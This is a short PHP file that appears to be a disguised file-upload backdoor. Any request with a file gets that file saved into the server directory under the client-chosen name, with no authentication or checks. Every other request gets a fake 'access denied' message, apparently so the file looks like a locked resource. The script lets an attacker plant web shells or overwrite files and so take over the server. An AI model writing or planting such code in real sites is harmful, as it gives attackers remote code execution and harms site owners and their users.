<?php
if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "";
} else {
    echo "Access to this resource has been denied.";
}
?>